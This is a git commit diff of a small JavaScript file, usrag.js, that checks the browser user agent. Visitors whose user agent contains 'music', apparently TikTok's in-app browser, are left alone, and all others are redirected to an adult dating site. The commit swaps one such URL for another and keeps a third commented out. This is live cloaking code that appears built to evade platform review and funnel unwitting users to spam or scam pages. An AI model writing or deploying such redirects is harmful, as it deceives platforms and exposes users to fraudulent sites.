933dc9ffc1d5e88aa9ba84f1c1621c3304f98e78
FixYourSelf1 <72053190+FixYourSelf1@users.noreply.github.com>
2024-03-13 11:56:55 +0200

    Update usrag.js

--- usrag.js
+++ usrag.js
@@ -3,7 +3,7 @@ let agent = navigator.userAgent;
 if (agent.indexOf('music') >= 0) {
   console.log('in tiktok app');
 } else {
-  window.location = 'https://lovepersonaldate.life/?u=rudktec&o=9kgp9mx';
+  window.location = 'https://hornyfinder615v.com/?utm_source=geh1yvUbd1CJ';
 //  window.location = 'https://watchmenow.cam/';
 }
 // document.querySelector('body').innerText = agent;
